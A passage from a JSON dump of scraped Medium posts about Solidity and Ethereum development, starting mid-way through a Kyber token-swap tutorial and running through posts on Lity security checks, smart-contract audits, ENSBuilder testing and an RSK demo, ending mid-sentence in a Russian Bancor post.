0x47a793D7D0AA5727095c3Fe132a6c1A46804c8D2 \u2014 this we will use again, so let\u2019s assign it to a variable:let userWallet = '0x47a793D7D0AA5727095c3Fe132a6c1A46804c8D2'We have a Trade.sol in our Solidity folder, which we help us in swapping the token. You can check out the code for the contract: examples > solidity > Trade.sol.Now, we need to get an instance for that Contract:let tradeInstance = await Trade.at(Trade.address)Next, as we are going to swap KNC with OMG, let's get the Instance for both contracts. You can find these token contract undercontracts \u2192 mockTokens . These are mock ERC20 tokens. In production, you will need actual contract address for these tokens on ETH MainNet.let kncInstance = await KyberNetworkCrystal.at(KyberNetworkCrystal.address)let omgInstance = await OmiseGo.at(OmiseGo.address)Now, let\u2019s get our balance for each token:let kycBalance1 = (await kncInstance.balanceOf(userWallet)).toString()let omgBalance1 = (await omgInstance.balanceOf(userWallet)).toString()You can check these balance by running:kycBalance1omgBalance1Now, we need to give Trade contract approval to withdraw tokens from our contract:await kncInstance.approve(tradeInstance.address , web3.utils.toWei('100000'), {from : userWallet})We can now swap tokens! Let\u2019s look at the Trade.sol method, which we will use to swap the tokens:function execSwap( ERC20 srcToken, uint srcQty, ERC20 destToken, address destAddress, uint maxDestAmount)Here,srcToken \u2014 source token contract addresssrcQty \u2014 amount of source tokensdestToken \u2014 destination token contract addressdestAddress \u2014 address to send swapped tokens tomaxDestAmount \u2014 address to send swapped tokens toSo let\u2019s call the method accordingly:tradeInstance.execSwap(kncInstance.address, web3.utils.toWei(\"100\") , omgInstance.address,userWallet, web3.utils.toWei(\"1000000\"), {from: userWallet})If you have followed the tutorial \u2018till now, you have successfully swapped two tokens using Kyber Network protocol!Let\u2019s verify our token balance again:let kycBalance2 = (await kncInstance.balanceOf(userWallet)).toString()let omgBalance2 = (await omgInstance.balanceOf(userWallet)).toString()kycBalance2omgBalance2You will see the change in balance. Here is a video demo for the above tutorial.ConclusionIf you faced any problem you can check here or ask questions in Kyber\u2019s network telegram group. Kyber also has good documentation. So, what are you waiting for? Integrate your Dapp with Kyber network!Let us know what you want to learn about in the comment section.\ud83d\udc47About QuikNodeQuikNode is building infrastructure to support the future of Web3. Since 2017, we\u2019ve worked with hundreds of developers & companies, helping scale dApps and providing high-performance Ethereum nodes. We\u2019re working on something interesting from the past few months and will be launching soon, so subscribe our newsletter for more updates!! \ud83d\ude03", "responses": 0, "tags": ["Ethereum", "Smart Contracts", "Solidity", "Defi", "Web3"]}, {"title": "How Lity Makes Programs Safer, a #CVM Mini-Series", "post_link": "https://medium.com/cybermiles/how-lity-makes-programs-safer-a-cvm-mini-series-f9aca768757?source=search_post", "author_name": "Mark Brinkerhoff", "author_link": "https://medium.com/@mbrinkerhoff", "publish_date": "2018-08-20", "last_modified_date": "2018-08-24", "readtime": "2.24", "claps": 184, "voters": 7, "content": "How Lity Makes Programs Safer, a #CVM Mini-SeriesMark BrinkerhoffFollowAug 20, 2018 \u00b7 3 min readLity is set apart by, as previously mentioned in the first of our four-part series, a dynamically-extensible language, a compiler (Lityc), and CyberMiles\u2019 own virtual machine (CVM) \u2014 all on the CyberMiles blockchain. As a superset of the Solidity language, it is more extensible, performative, and safe. How so?The Library + Ethereum Native Interface (libENI) dynamic virtual machine extension allows native functions to be added to the CVM on the fly, without stopping, forking or upgrading the blockchain.The Lity Rules Engine (coming soon) will allow formal business rules to be embedded in smart contracts, promising to drastically increase developer productivity and to reduce errors.The ERC checker not only checks but also automatically fixes common security bugs in smart contracts.For the purpose of this exercise, let\u2019s dive a little deeper into the security aspects of Lityc and CVM, those which make programs run more safely.Take Advantage of Better SecurityOur team has categorized known security issues with Ethereum Solidity smart contracts, extracted common coding patterns that lead to those issues, and installed checks for those patterns in both the Lity language compiler and CVM. We\u2019ve taken proactive steps to safeguard against 95% of smart contract bugs that lead to money loss on Ethereum \u2014 bugs that are highly unlikely to occur in the first place on the CyberMiles blockchain.Use Lityc to Secure Your ContractUnderstanding the ERC checker and overflow protection is key to making proper use of Lityc.The ERC checker is a Lity compiler facility, which ensures that smart contracts correctly comply to the ERC standards they claim to implement. Notably, in the ERC universe:ERC20 is the most common token/coin issuance contract standard.[Watch our ERC20 checker overview][See the ERC20 checker in action]ERC223 is an enhancement to ERC20. It guards against inadvertent fund transfers to contract addresses, which is a common source of fund loss on Ethereum. (Incidentally, we recommend that all ERC20 contracts on CyberMiles conform to the ERC223 standard for better safety.)[Watch our ERC223 checker overview][See the ERC223 checker in action]ERC721 is the contract standard to issue non-fungible tokens.[Watch our ERC721 checker overview][See the ERC721 checker in action]ERC827 is another enhancement to make ERC20 easier and safer to use while maintaining compatibility with ERC20 tools.[Watch our ERC827 checker overview][See the ERC827 checker in action]ERC884 is a security token standard to issue stick certificates.[Watch our ERC884 checker overview][See the ERC884 checker in action]Integer overflow is one of the most common security issues in Ethereum smart contracts. Lity proactively eliminates the opportunities for integer overflow in smart contract code. How so?The Lityc checks for the use of SafeMath on integers. It throws warnings if integer operations are not wrapped around in SafetMath.The CVM detects integer overflow at runtime, and stops the contract execution with an error vs. continuing with the overflowed integer numbers.Developed by The CyberMiles Foundation, Lity is released under GPL as a free software. Still interested? Then refer to our latest, most up-to-date documentation to get started today!Additional ResourcesLity sourceLity docslibENI sourcelibENI docsCyberMiles sourceCyberMiles docs", "responses": 1, "tags": ["Blockchain", "Cvm", "Cybermiles", "Lity", "Solidity"]}, {"title": "Saved by the Audit", "post_link": "https://blog.b9lab.com/https-blog-b9lab-com-saved-by-audits-bc64ea65446c?source=search_post", "author_name": "Rob Hitchens", "author_link": "https://blog.b9lab.com/@robhitchens", "publish_date": "2019-09-04", "last_modified_date": "2019-09-04", "readtime": "3.01", "claps": 51, "voters": 8, "content": "Saved by the AuditA founder\u2019s guide to smart contact auditsRob HitchensFollowSep 4 \u00b7 4 min readYour team is amazing, your system is ready to go and everything is great!Hold up!Is it ready for production? How do you know? Is it because your developers said so?Overconfidence is a key contributor to many disasters and management teams often exacerbate the problem by creating feedback mechanisms that reward optimism and discourage caution. Your technical team wouldn\u2019t be unusual if they were feeling pressured to enthusiastically launch the project in the real world.What about quality-assurance?While your technical team may believe that the system is ready to go, ultimate responsibility falls on the management team. They alone decide when the system is ready for operation and they alone decide on the diligence to apply to that decision.An independent software audit is a must-do action item for any serious project. Independent software audits show:You are investing in due diligence.People who were incentivized to find defects conducted a meticulous search for them.Experts outside of your own team have accepted reputational risk for the software.And, knowledge that their work product will be subjected to peer-review is, in itself, a strong motivator for developers.Audits raise the stakes internally by inviting the possibility of professional embarrassment. However, while embarrassment can be uncomfortable, it is less uncomfortable than serious issues in a production setting \u2014 issues with much higher reputational and financial stakes and a realistic possibility that repair will be impossible. Development is a team sport and it is far better to have a spirited internal debate about the implications of a few lines of code than to experiment in the real world, come what may.Founders are well-advised to consider the additional liability that goes with skipping an industry-standard step. What if something goes wrong after the management team decided to rely exclusively on internal risk assessments? A plaintiff would probably want to know more about that.When airplanes fall out of the sky or funds disappear it is seldom the individual engineer who is held accountable. Processes are scrutinized in detail, and management may be asked to explain why more care wasn\u2019t given to code review.Have a look at a sampling of disasters that were prevented by software audits.Attacker can steal assets from another user. A subtle oversight in function logic means users could seize assets from other users. In other words, chaos. https://github.com/solidified-platform/audits/blob/master/Audit%20Report%20-%20Argent%20%5B26-11-2018%5D%20.pdfColluding participants can cheat the honest users. This is interesting because it\u2019s not an error you can find in the code, per se. It is a game-theoretic threat that the design doesn\u2019t exclude. https://github.com/solidified-platform/audits/blob/master/Audit%20Report%20-%20BetX%20%5B21.01.2019%5D.pdfThe \u201ctoken\u201d is not compliant which will lead to its rejection by exchanges and incompatibility with user wallets. The code itself works as designed, but the design doesn\u2019t accomplish the goal. https://github.com/solidified-platform/audits/blob/master/Audit%20Report%20-%20EZToken%20%5B02.11.18%5D.pdfIncorrect calculation of premiums would cause errors in the business logic. https://github.com/solidified-platform/audits/blob/master/Audit%20Report%20-%20Melonport%20%5B09.01.2019%5D.pdfAttacker can empty the contract. And, it\u2019s gone \u2026 https://github.com/solidified-platform/audits/blob/master/Audit%20Report%20-%20Nexus%20Mutual%20%5B22.04.2019%5D.pdfThe author\u2019s intent is not to pick on those projects. Indeed, the author has great respect for them. The list is to show that subtle problems can lead to catastrophic failure. These sorts of errors and oversights can and do emerge in projects by the most capable teams money can buy. Independent and thorough code review is a must-do step.Becoming a smart contract auditor means mastering the subtleties of Solidity, the EVM, best practices, known attack vectors and game-theoretic analysis. Smart Contract Auditors are a special breed of best-in-class coders who are not only meticulous in their inspection but are also creative enough to imagine unexpected attack and accident scenarios. It is no surprise that auditors are among the highest-paid developers. They also take on the greatest responsibility - determining when the system is ready to fly.Leading blockchain training provider, B9lab Academy is partnered with the leading Ethereum contract auditor Solidified.io to present the world\u2019s first Smart Contract Auditor Certification. This mentored program is a gruelling deep dive for committed individuals who aspire to become the best of the best and save projects from hidden danger.\u2014 \u2014 -Write to info@b9lab.com to work with a B9lab certified Smart Contract Auditor. Boost your internal capabilities by sending your developers on the course. Prepare yourself for the auditor training with complimentary access to the mentored B9lab Certified Ethereum Developer Course.", "responses": 0, "tags": ["Blockchain", "Solidity Testing", "Solidity", "Training", "Ethereum"]}, {"title": "BitDegree smart contract course \u201ca great entry point to our financial and educational ecosystem\u201d (MVP demo)", "post_link": "https://blog.bitdegree.org/bitdegree-smart-contract-course-a-great-entry-point-to-our-financial-and-educational-ecosystem-b27946629b1c?source=search_post", "author_name": "BitDegree", "author_link": "https://blog.bitdegree.org/@bitdegree", "publish_date": "2017-11-28", "last_modified_date": "2018-02-27", "readtime": "1.72", "claps": 10, "voters": 4, "content": "BitDegree smart contract course \u201ca great entry point to our financial and educational ecosystem\u201d (MVP demo)BitDegreeFollowNov 28, 2017 \u00b7 2 min readBitDegree has released a demonstration smart contract course on its Minimal Viable Product (MVP) ahead of its token crowdsale on December 1st, 2017. The course and the MVP can be found on the BitDegree platform.You can check it out HERE.The demo course is based upon the smart-contract course which is being developed in conjunction with BitDegree\u2019s Cryptocurrency Advisor an nexchange.io founder, Oleg Belousov. It will teach the core concepts of the Solidity programming language, which is used to create smart contracts on the ethereum blockchain. Upon its completion, the finalized course will be taught by Belousov.The smart contract course will be aimed at beginner-level web developers who have basic programming knowledge, but would like to develop their skills, plus their understanding of blockchain. They will make progress on the course by completing a series of coding tasks in each lesson.Learners will also be able to interact with the contracts they are coding on the BitDegree platform. The course will allow learners to become more familiar with how the BitDegree token (BDG) based ecosystem worksAbout the smart contract course, Belousov commented: \u201cIt provides exceptional educational value through quality course content, and serves as a great entry point to our financial and educational ecosystem.\u201dUsing an MVP will give potential token sale participants and employers the opportunity to see how the platform will function, and how it will look.From a development perspective, having an MVP will provide BitDegree with the opportunity to gauge feedback from the platform\u2019s early adopters, or those who buy their BitDegree tokens during the very first days of the token sale. Their early engagement with the platform will allow BitDegree\u2019s developers to add or remove products based on user feedback.The MVP model assist will help BitDegree\u2019s developers correctly scale the platform\u2019s rate of growth, and has previously been used by Instagram and Uber to set a realistic development scale.After trying our MVP, please send your feedback to us at [email\u00a0protected], or having a chat with us on Telegram!", "responses": 0, "tags": ["Ethereum", "Solidity", "Blockchain", "Smart Contracts"]}, {"title": "Getting Started with Lity, a #CVM Mini-Series", "post_link": "https://medium.com/cybermiles/getting-started-with-lity-a-cvm-mini-series-cda2a1265c62?source=search_post", "author_name": "Mark Brinkerhoff", "author_link": "https://medium.com/@mbrinkerhoff", "publish_date": "2018-08-13", "last_modified_date": "2018-08-13", "readtime": "1.56", "claps": 109, "voters": 6, "content": "Getting Started with Lity, a #CVM Mini-SeriesMark BrinkerhoffFollowAug 13, 2018 \u00b7 2 min readThe CyberMiles team recently announced the introduction of Lity, a new programming language for building blockchain-based \u201csmart business contracts.\u201d Lity, whose name is partly meant as an homage to Ethereum\u2019s Solidity, is designed to be, at once, more flexible/extensible (liquid) and better performing (combustable).First Things FirstLity and the CyberMiles virtual machine (CVM) were developed to bring to the blockchain the necessary features that answer real-world needs. These features, which hardly exist (or are non-existent) within projects like Ethereum, include:Safety. Lity makes CyberMiles safer than other chains, avoiding issues (see: Beauty Chain, SmartMesh) that will not occur on CyberMiles\u2019 blockchain.Extensibility. With Lity, Library + Ethereum Native Interface (libENI) functions are optimized for common e-commerce scenarios, decentralized applications (DApps), and customized blockchains.E-commerce functionality. Lity and the CVM make it possible to provide libENI functions optimized for, as one example, PKI-based encryption to protect privacy.Schedulability. Offering an indispensable tool for financial contracts in worldwide use, Lity compares favorably to Ethereum, which can\u2019t easily support functions such as installments for e-commerce purchases, retirement savings, payroll, interest payments, and much, much more.Trust. Behind Lity is a capable, experienced, well-rounded team you can trust to do it right.Service. CyberMiles, an open source, public blockchain, can provide customized services including technology (notably Lity, CVM and smart business contracts), marketing and business operations.Alright, Let\u2019s GoTo get started, you first will need to download and install the Lity compiler. Once installed, you can begin to write and compile a Lity smart contract, and, from there, start a CyberMiles node and execute the smart contract on the blockchain. Our documentation will guide you through this process.1. Download and install the Lity compiler2. Write and compile a Lity smart contract3. Start a CyberMiles node4. Run the smart contractDeveloped by The CyberMiles Foundation, Lity is released under GPL as a free software. To download and install Lity today, please refer to our latest, most up-to-date documentation.Additional ResourcesLity sourceLity docslibENI sourcelibENI docsCyberMiles sourceCyberMiles docs", "responses": 0, "tags": ["Blockchain", "Cvm", "Cybermiles", "Lity", "Solidity"]}, {"title": "Learn: New Resources Available at LearnChannels.org", "post_link": "https://medium.com/blockchannel/learn-new-resources-available-at-learnchannels-org-2f784fab7835?source=search_post", "author_name": "Steven McKie", "author_link": "https://medium.com/@McKie", "publish_date": "2018-09-18", "last_modified_date": "2018-09-19", "readtime": "0.71", "claps": 69, "voters": 7, "content": "Learn: New Resources Available at LearnChannels.orgState Channel Education for EveryoneSteven McKieFollowSep 18, 2018 \u00b7 1 min readWhile state and payment channels are a key component of Layer 2 scaling, accessible information about them is either scattered across the internet or simply nonexistent. LearnChannels, a community effort by state channel researchers and implementers, is changing that.On LearnChannels, you\u2019ll find technical and nontechnical explanations, code walkthroughs, and much more. We aim to create a one-stop shop for anyone interested in learning more about state and payment channels \u2014 seasoned Web3 developers and laymen will both find information suited to their needs.LearnChannels welcomes community contributions; code examples, explainers, translations, and web design are all great ways to help. If you\u2019re interested, please submit a PR with a .md or HTML file to this repository or send a message to @hthillman on Twitter!", "responses": 0, "tags": ["Solidity", "State Channels", "Education", "Ethereum", "Blockchain"]}, {"title": "Testing contracts that use ENS with ENSBuilder", "post_link": "https://medium.com/ethworks/testing-contracts-that-use-ens-with-ensbuilder-1806592da57f?source=search_post", "author_name": "Marek Kirejczyk", "author_link": "https://medium.com/@marekkirejczyk", "publish_date": "2018-09-28", "last_modified_date": "2018-09-28", "readtime": "1.20", "claps": 52, "voters": 6, "content": "Testing contracts that use ENS with ENSBuilderMarek KirejczykFollowSep 28, 2018 \u00b7 2 min readWhen it comes to testing contracts and functionality that uses Ethereum Naming System (ENS), it is a bit tricky. It is difficult to test in isolation from ENS, and it is hard to stub ENS.We stumble upon that challenge when working on Universal Login SDK.To solve that problem we created a simple library called ENSBuilder, which allows one to quickly set up and configure a standalone instance of ENS, on a local environment, in tests or on a test chain.With ENSBuilder setup is as easy as a single method call:const ensAddress = await builder.bootstrapWith(\u2018example\u2019, \u2018eth\u2019);And you already have a copy of ENS, up and running, as well as two domains registered: \u2018ens\u2019 and \u2018example.ens\u2019.You can now register an address:await builder.registerAddress(\u2018marek\u2019, \u2018example.eth\u2019, \u20180x\u2026\u2019);Ethers.jsThe builder uses ethers.js as a contract abstraction. Web3js is also supported but will require you to pass a private key. We plan to add better web3js support if we see requests from people to do it. We would also happily accept PRs :)Why Ethers.js you may ask?We find ethers.js to be a stable, light, feature complete and production ready alternative to web3js. Therefore we are using it both for tests as well as application code.Getting StartedFor in-depth information as well as a quick tutorial go to EnsBuilder GitHub.If you enjoyed this post, please hit the \ud83d\udc4f button and if you would like to get notified when new story shows up, click follow button below.You can also follow us on Facebook and Twitter.", "responses": 0, "tags": ["Ethereum", "Solidity", "Testing"]}, {"title": "RSK Karbon14 Demo", "post_link": "https://medium.com/@karbon14/rsk-karbon14-demo-b14c9475e7cc?source=search_post", "author_name": "Karbon14", "author_link": "https://medium.com/@karbon14", "publish_date": "2019-01-25", "last_modified_date": "2019-01-25", "readtime": "2.27", "claps": 58, "voters": 6, "content": "RSK Karbon14 DemoKarbon14FollowJan 25 \u00b7 3 min readIn our previous post The karbon14 demo we tested the demo working over the Ethereum Ropsten network, but Karbon14 solution needs a Smart Contract crypto platform to be able to work, which shouldn`t necessarily be Ethereum.Today we want to prove that the above key point is valid for other networks than Ethereum, and we focused on deploying the demo fully working over RSK.RSK is the first open-source smart contract platform with a 2-way peg to Bitcoin that also rewards the Bitcoin miners via merge-mining, allowing them to actively participate in the Smart Contract revolution. RSK goal is to add value and functionality to the Bitcoin ecosystem by enabling smart-contracts, near instant payments and higher-scalability.Solidity for Smart ContractsSince the RSK platform also let us develop our Smart Contract on Solidity, we deployed the same Karbon14 Smart Contract, but this time on the RSK Testnet.We had success, and the deployment was successful in the first try.The contract was deployed at: https://explorer.testnet.rsk.co/address/0xb33cdfe57e806f66819722680324e55d0cd18441Karbon14 Contract details. RSK explorer.Karbon14 UI demo adaptationSince the new contract was deployed, and the RSK can also be used with Metamask, as you can read on the RSK Wiki, next step was to adapt the UI for working on the new network.This step was also easier than expected and achieved with only 1 commit diff between our master and rsk branches on GitHub demo repository.Karbon14 UI demo deployedOnce adapted the UI, we deployed it on: https://rsk.karbon14.orgWe created some Crypto Scribes.We used the RSK Tesnet Faucet to have some RBTC balance on our Metamask wallet accounts and started testing the Karbon14 Demo.We created some Scribes, and also Requested some Proofs validations in order to test the complete flow. The result was just great, all it\u2019s working as expected and just as well as in the Ethereum version.Final notesKarbon14 solution is network agnostic, and with this exercise we prove it. A new platform like RSK can work great with our solution and that is because of the potential related to the Smart Contracts.We will let deployed the RSK demo so you can play with it also, and remember that if you want a step-by-step guide, you have our previous post. And for the RSK questions, you will be founding the answers in the RSK Wiki.For further information, you can visit https://karbon14.orgOr contact us in any of our social mediaTelegram https://t.me/karbon14Twitter https://twitter.com/k14projectFacebook https://www.facebook.com/k14projectGithub https://github.com/karbon14Instagram www.instagram.com/k14projectGoogle+ https://plus.google.com/+k14project", "responses": 1, "tags": ["Rsk", "Rsksmart", "Smart Contracts", "Solidity"]}, {"title": "Blockwatch: Berlin Blockchain Day Panel", "post_link": "https://medium.com/hackernoon/blockwatch-berlin-blockchain-day-panel-22528d94933c?source=search_post", "author_name": "Chris Chinchilla", "author_link": "https://medium.com/@ChrisChinchilla", "publish_date": "2018-01-16", "last_modified_date": "2018-04-22", "readtime": "0.53", "claps": 21, "voters": 5, "content": "Blockwatch: Berlin Blockchain Day PanelChris ChinchillaFollowJan 16, 2018 \u00b7 1 min readOn a cold Friday December night, with a Christmas market buzzing outside, a small group of Blockchain enthusiasts gathered for a \u2018day\u2019 (actually an afternoon) of discussions with luminaries from the community organized by Binary District, a new global education center. As is traditional for events in Berlin, the time of year had thrown well-made plans into disruption, and the organizers have asked me to host a panel between all the speakers.On the panel are Alexander Ivanov (Blockchain entrepreneur), Dmitry Meshkov (Researcher and entrepreneur), Alexander Chepurnoy (Developer), and Vlad Zamfir (Ethereum team). I was interested in digging into how enthusiastic developers take their ideas into reality with smart contracts and \u2018traditional\u2019 programming languages and infrastructure.I wouldn\u2019t say all my questions were exactly answered, but it was an interesting panel nonetheless. Enjoy!Originally published at dzone.com.", "responses": 0, "tags": ["Blockchain", "Ethereum", "Solidity", "Smart Contracts", "Development"]}, {"title": "\u041f\u0440\u043e\u0442\u043e\u043a\u043e\u043b Bancor", "post_link": "https://ru.blog.bancor.network/%D0%BF%D1%80%D0%BE%D1%82%D0%BE%D0%BA%D0%BE%D0%BB-bancor-1e5b3dd22597?source=search_post", "author_name": "Bancor", "author_link": "https://ru.blog.bancor.network/@bancor", "publish_date": "2017-07-13", "last_modified_date": "2018-04-11", "readtime": "1.70", "claps": 10, "voters": 3, "content": "\u041f\u0440\u043e\u0442\u043e\u043a\u043e\u043b BancorBancorFollowJul 13, 2017 \u00b7 2 min read\u041f\u0440\u0438\u0432\u0435\u0442 \u041c\u0438\u0440! \u041c\u044b \u043a\u043e\u043c\u0430\u043d\u0434\u0430 \u043f\u0440\u043e\u0435\u043a\u0442\u0430 Bancor Protocol (PDF) \u0438 \u043c\u044b \u0441\u043e\u0437\u0434\u0430\u0451\u043c \u0434\u0435\u0446\u0435\u043d\u0442\u0440\u0430\u043b\u0438\u0437\u043e\u0432\u0430\u043d\u043d\u0443\u044e, \u0438\u0435\u0440\u0430\u0440\u0445\u0438\u0447\u0435\u0441\u043a\u0443\u044e \u043c\u043e\u043d\u0435\u0442\u0430\u0440\u043d\u0443\u044e \u0441\u0438\u0441\u0442\u0435\u043c\u0443 \u043d\u0430 \u0431\u043b\u043e\u043a\u0447\u0435\u0439\u043d\u0435\u0415\u0441\u043b\u0438 \u043f\u043e\u0441\u043c\u043e\u0442\u0440\u0435\u0442\u044c \u043d\u0430 \u043c\u0438\u0440 \u043e\u0431\u043c\u0435\u043d\u0430 \u043c\u0435\u0436\u0434\u0443 \u043b\u044e\u0434\u044c\u043c\u0438, \u043c\u044b \u0443\u0432\u0438\u0434\u0438\u043c \u0434\u0432\u0435 \u043e\u0441\u043d\u043e\u0432\u043d\u044b\u0445 \u043a\u0430\u0442\u0435\u0433\u043e\u0440\u0438\u0438 \u0432\u0435\u0449\u0435\u0439, \u043a\u043e\u0442\u043e\u0440\u044b\u043c\u0438 \u043c\u044b \u043e\u0431\u043c\u0435\u043d\u0438\u0432\u0430\u0435\u043c\u0441\u044f \u0438 \u0442\u043e\u0440\u0433\u0443\u0435\u043c \u2014 \u0418\u043d\u0444\u043e\u0440\u043c\u0430\u0446\u0438\u044f \u0438 \u0426\u0435\u043d\u043d\u043e\u0441\u0442\u044c. \u0415\u0441\u043b\u0438 \u0438\u043d\u0444\u043e\u0440\u043c\u0430\u0446\u0438\u044f (\u0442\u0430\u043a\u043e\u0439 \u043a\u043e\u043d\u0442\u0435\u043d\u0442 \u043a\u0430\u043a \u0442\u0435\u043a\u0441\u0442\u044b, \u043a\u0430\u0440\u0442\u0438\u043d\u043a\u0438, \u0432\u0438\u0434\u0435\u043e, \u0442.\u0434.) \u0437\u0430\u043c\u0435\u043d\u044f\u0435\u043c\u0430 \u043f\u043e \u0441\u0432\u043e\u0435\u0439 \u043d\u0430\u0442\u0443\u0440\u0435 (\u043a\u043e\u0433\u0434\u0430 \u0432\u044b \u0434\u0435\u043b\u0438\u0442\u0435\u0441\u044c \u0435\u044e, \u0442\u043e \u0432\u044b \u0438 \u043a\u0442\u043e-\u0442\u043e \u0435\u0449\u0451 \u0432\u043b\u0430\u0434\u0435\u0435\u0442\u0435 \u0435\u044e), \u0442\u043e \u0446\u0435\u043d\u043d\u043e\u0441\u0442\u044c \u2014 \u043d\u0435\u0442 (\u043a\u043e\u0433\u0434\u0430 \u0432\u044b \u043e\u0442\u0434\u0430\u0435\u0442\u0435 \u0435\u0451 \u043a\u043e\u043c\u0443-\u043d\u0438\u0431\u0443\u0434\u044c, \u0432\u044b \u0431\u043e\u043b\u044c\u0448\u0435 \u043d\u0435 \u0432\u043b\u0430\u0434\u0435\u0435\u0442\u0435 \u0435\u044e).\u0417\u0430 \u043d\u0435\u043a\u043e\u0442\u043e\u0440\u043e\u0435 \u0432\u0440\u0435\u043c\u044f \u0434\u043e \u043f\u043e\u044f\u0432\u043b\u0435\u043d\u0438\u044f \u0418\u043d\u0442\u0435\u0440\u043d\u0435\u0442\u0430, \u0441\u0443\u0449\u0435\u0441\u0442\u0432\u043e\u0432\u0430\u043b\u043e \u0431\u043e\u043b\u044c\u0448\u043e\u0435 \u043a\u043e\u043b\u0438\u0447\u0435\u0441\u0442\u0432\u043e \u0447\u0430\u0441\u0442\u043d\u044b\u0445 \u0438\u043d\u0444\u043e\u0440\u043c\u0430\u0446\u0438\u043e\u043d\u043d\u044b\u0445 \u0441\u0435\u0442\u0435\u0439, \u043d\u0435\u043a\u043e\u0442\u043e\u0440\u044b\u0435 \u0438\u0437 \u0412\u0430\u0441 \u0434\u0430\u0436\u0435 \u0432\u043e\u0437\u043c\u043e\u0436\u043d\u043e \u0437\u0430\u0441\u0442\u0430\u043b\u0438 \u0438\u0445. \u041d\u0430\u043f\u0440\u0438\u043c\u0435\u0440 BBSs, Prodigy, Compuserve, AoL. \u0421\u0442\u0430\u043d\u043e\u0432\u043b\u0435\u043d\u0438\u0435 \u043e\u0431\u0449\u0435\u0441\u0442\u0432\u0435\u043d\u043d\u043e\u0433\u043e \u0418\u043d\u0442\u0435\u0440\u043d\u0435\u0442\u0430 \u0432\u0441\u0451 \u0438\u0437\u043c\u0435\u043d\u0438\u043b\u043e, \u0438 \u0442\u0435, \u043a\u0442\u043e \u0432\u044b\u0436\u0438\u043b, \u043d\u0430\u0443\u0447\u0438\u043b\u0438\u0441\u044c \u043f\u0440\u0438\u0441\u043f\u043e\u0441\u0430\u0431\u043b\u0438\u0432\u0430\u0442\u044c\u0441\u044f \u043a \u043d\u043e\u0432\u044b\u043c \u043e\u0442\u043a\u0440\u044b\u0442\u044b\u043c, \u0432\u0441\u0435\u043c\u0438\u0440\u043d\u044b\u043c \u0441\u0442\u0430\u043d\u0434\u0430\u0440\u0442\u0430\u043c \u0438\u043d\u0444\u043e\u0440\u043c\u0430\u0446\u0438\u043e\u043d\u043d\u043e\u0433\u043e \u043e\u0431\u043c\u0435\u043d\u0430, \u043e\u0441\u043d\u043e\u0432\u0430\u043d\u043d\u044b\u043c\u0438 \u043d\u0430 \u0441\u043e\u0435\u0434\u0438\u043d\u0435\u043d\u0438\u0438 \u0441\u0435\u0442\u0435\u0439 TCP/IP, \u0432\u0437\u0430\u0438\u043c\u043e\u0441\u0432\u044f\u0437\u0430\u043d\u043d\u044b\u0445 \u0447\u0435\u0440\u0435\u0437 \u043f\u0438\u0440\u0438\u043d\u0433\u043e\u0432\u044b\u0435 \u0441\u043e\u0433\u043b\u0430\u0448\u0435\u043d\u0438\u044f.\u0414\u043e \u043f\u043e\u044f\u0432\u043b\u0435\u043d\u0438\u044f \u0442\u0435\u0445\u043d\u043e\u043b\u043e\u0433\u0438\u0438 \u0431\u043b\u043e\u043a\u0447\u0435\u0439\u043d, \u0432\u0441\u0435 \u0432\u0430\u043b\u044e\u0442\u044b, \u043a\u043e\u0442\u043e\u0440\u044b\u0435 \u043f\u0440\u0435\u0434\u0441\u0442\u0430\u0432\u043b\u044f\u043b\u0438 \u043a\u0430\u043a\u0443\u044e-\u043b\u0438\u0431\u043e \u0446\u0435\u043d\u043d\u043e\u0441\u0442\u044c, \u0441\u0443\u0449\u0435\u0441\u0442\u0432\u043e\u0432\u0430\u043b\u0438 \u043e\u0442\u0434\u0435\u043b\u044c\u043d\u043e \u0434\u0440\u0443\u0433 \u043e\u0442 \u0434\u0440\u0443\u0433\u0430. \u0411\u043b\u043e\u043a\u0447\u0435\u0439\u043d \u0442\u0435\u0445\u043d\u043e\u043b\u043e\u0433\u0438\u044f \u2014 \u0432\u043f\u0435\u0440\u0432\u044b\u0435 \u0438\u0441\u043f\u043e\u043b\u044c\u0437\u043e\u0432\u0430\u043d\u043d\u0430\u044f \u0432 \u0411\u0438\u0442\u043a\u043e\u0438\u043d\u0435 \u2014 \u044d\u0442\u043e \u0434\u0435\u0446\u0435\u043d\u0442\u0440\u0430\u043b\u0438\u0437\u043e\u0432\u0430\u043d\u043d\u0430\u044f \u0441\u0435\u0442\u044c \u043e\u0431\u043c\u0435\u043d\u0430 \u0446\u0435\u043d\u043d\u043e\u0441\u0442\u044f\u043c\u0438, \u201c\u0418\u043d\u0442\u0435\u0440\u043d\u0435\u0442 \u0434\u0435\u043d\u0435\u0433\u201d. \u0421\u043e \u0432\u0440\u0435\u043c\u0435\u043d\u0435\u043c \u044d\u0442\u0430 \u0442\u0435\u0445\u043d\u043e\u043b\u043e\u0433\u0438\u044f \u0437\u0430\u043c\u0435\u043d\u0438\u0442 \u0431\u043e\u043b\u044c\u0448\u0443\u044e \u0447\u0430\u0441\u0442\u044c \u0441\u0435\u0433\u043e\u0434\u043d\u044f\u0448\u043d\u0438\u0445 \u043f\u0440\u0438\u0432\u0430\u0442\u043d\u044b\u0445 \u0431\u0430\u043d\u043a\u043e\u0432\u0441\u043a\u0438\u0445 \u0441\u0435\u0442\u0435\u0439 \u0438 \u043f\u043e\u0437\u0432\u043e\u043b\u0438\u0442 \u043d\u043e\u0432\u044b\u043c \u0438\u0433\u0440\u043e\u043a\u0430\u043c (\u0438 \u0430\u0434\u0430\u043f\u0442\u0438\u0440\u043e\u0432\u0430\u0432\u0448\u0438\u043c\u0441\u044f \u0441\u0442\u0430\u0440\u044b\u043c) \u0441\u043e\u0437\u0434\u0430\u0432\u0430\u0442\u044c \u043d\u043e\u0432\u044b\u0435 \u0432\u0438\u0434\u044b \u0446\u0435\u043d\u043d\u043e\u0441\u0442\u0435\u0439 \u0438 \u043e\u0431\u043c\u0435\u043d\u0438\u0432\u0430\u0442\u044c\u0441\u044f \u0432 \u043e\u0442\u043a\u0440\u044b\u0442\u043e\u0439, \u0432\u0441\u0435\u043c\u0438\u0440\u043d\u043e\u0439 \u0441\u0438\u0441\u0442\u0435\u043c\u043e\u0439, \u043a\u043e\u0442\u043e\u0440\u043e\u0439 \u043d\u0438\u043a\u0442\u043e \u043d\u0435 \u0432\u043b\u0430\u0434\u0435\u0435\u0442.\u041a\u043e\u043c\u0430\u043d\u0434\u0430 Bancor \u0441\u043e\u0437\u0434\u0430\u0432\u0430\u043b\u0430 \u0418\u043d\u0442\u0435\u0440\u043d\u0435\u0442 